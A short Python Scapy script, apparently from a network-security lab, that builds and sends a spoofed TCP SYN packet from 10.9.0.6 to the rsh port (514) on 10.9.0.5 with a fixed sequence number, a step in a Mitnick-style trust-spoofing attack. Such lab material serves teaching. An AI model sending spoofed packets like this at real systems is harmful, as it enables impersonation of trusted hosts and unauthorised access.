from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=1023, dport=514, flags="S", seq=2631742050)

pkt = ip/tcp

print("Sending spoofed syn packet")
ls(pkt)
send(pkt, verbose=0)
